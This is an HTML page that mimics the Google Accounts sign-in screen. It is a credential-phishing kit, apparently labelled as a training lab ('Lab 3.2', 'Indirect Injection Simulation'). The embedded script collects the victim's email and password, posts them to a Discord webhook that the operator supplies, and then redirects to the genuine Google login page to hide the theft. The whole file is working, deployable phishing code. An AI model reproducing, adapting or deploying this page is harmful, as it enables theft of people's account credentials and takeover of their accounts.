<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 350px; min-height: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
        img { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { color: #202124; font-size: 16px; margin-bottom: 24px; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: none; border: 2px solid #1a73e8; }
        button { width: 88px; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; float: right; margin-top: 30px; }
        .hidden { display: none; }
        .user-display { border: 1px solid #dadce0; border-radius: 16px; padding: 5px 15px; display: inline-flex; align-items: center; margin-bottom: 20px; font-size: 14px; }
        .footer { position: absolute; bottom: 40px; left: 40px; text-align: left; font-size: 14px; color: #1a73e8; font-weight: 500; cursor: pointer; }
    </style>
</head>
<body>

<div class="card" id="email-stage">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    <h1>Sign in</h1>
    <p>Use your Google Account</p>
    <input type="email" id="email" placeholder="Email or phone" autofocus>
    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot email?</div>
    <div class="footer">Create account</div>
    <button onclick="nextStep()">Next</button>
</div>

<div class="card hidden" id="password-stage">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    <h1>Welcome</h1>
    <div class="user-display" id="display-email"></div>
    <input type="password" id="pass" placeholder="Enter your password" autofocus>
    <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Forgot password?</div>
    <button onclick="transmit()">Next</button>
</div>

<script>
    let hook = sessionStorage.getItem('discord_hook');
    if (!hook) {
        hook = prompt("ENTER DISCORD WEBHOOK:");
        if (hook) sessionStorage.setItem('discord_hook', hook);
    }

    function nextStep() {
        const email = document.getElementById('email').value;
        if(!email) return;
        document.getElementById('display-email').innerText = email;
        document.getElementById('email-stage').classList.add('hidden');
        document.getElementById('password-stage').classList.remove('hidden');
    }

    async function transmit() {
        const e = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        const payload = {
            embeds: [{
                title: "🎯 Lab 3.2 Target Captured",
                color: 16711680,
                fields: [
                    { name: "User", value: `\`${e}\`` },
                    { name: "Password", value: `|| ${p} ||` }
                ],
                footer: { text: "Protocol: Indirect Injection Simulation" }
            }]
        };

        try {
            await fetch(hook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            // Redirect to actual Google to close the loop
            window.location.href = "https://accounts.google.com/ServiceLogin";
        } catch {
            window.location.href = "https://accounts.google.com/ServiceLogin";
        }
    }
</script>
</body>
</html>
